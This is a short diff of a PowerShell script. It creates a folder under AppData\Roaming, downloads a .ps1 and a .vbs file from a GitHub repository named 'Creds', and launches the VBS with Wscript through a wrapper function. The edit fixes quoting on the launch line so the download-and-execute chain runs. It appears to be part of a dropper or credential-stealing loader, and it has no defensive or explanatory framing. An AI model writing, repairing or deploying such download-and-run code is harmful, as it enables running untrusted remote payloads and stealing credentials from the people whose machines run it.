@@ -16,4 +16,4 @@ function mylow
 New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IgorAlaf/Creds/main/Invoke-loowodi.ps1" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IgorAlaf/Creds/main/Invoke-setup.vbs" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-setup.vbs"
-mylow -Command "Wscript.exe '%userprofile%/AppData/Roaming/tempFolder/Invoke-setup.vbs'"
+mylow -Command "Wscript.exe ""env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-setup.vbs"""
